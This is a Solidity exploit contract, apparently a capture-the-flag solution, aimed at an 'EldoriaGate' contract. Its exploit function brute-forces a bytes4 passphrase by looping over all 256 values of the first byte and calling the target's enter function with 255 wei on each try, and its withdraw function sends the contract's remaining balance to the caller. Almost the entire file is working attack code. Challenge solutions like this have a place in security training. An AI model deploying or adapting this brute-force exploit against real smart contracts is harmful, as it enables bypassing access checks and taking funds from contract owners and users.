// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IEldoriaGate {
    function enter(bytes4 passphrase) external payable;
    function checkUsurper(address _villager) external returns (bool);
}

contract EldoriaExploit {
    IEldoriaGate public target;

    constructor(address _target) {
        target = IEldoriaGate(_target);
    }

    // Function to brute force the passphrase and exploit in one go
    function exploit() external payable {
        require(msg.value >= 255 wei, "Need at least 255 wei");

        // Try all possible values for the first byte
        for (uint16 i = 0; i < 256; i++) {
            // Format passphrase with current byte value as the first byte
            bytes4 passphrase = bytes4(uint32(i) << 24);

            // Try with this passphrase
            try target.enter{value: 255}(passphrase) {
                // If we get here, we've found the right passphrase and executed successfully
                return;
            } catch (bytes memory) {
                // This passphrase didn't work, continue to next
                continue;
            }
        }

        revert("No working passphrase found");
    }

    // Allow withdrawing any remaining ETH
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
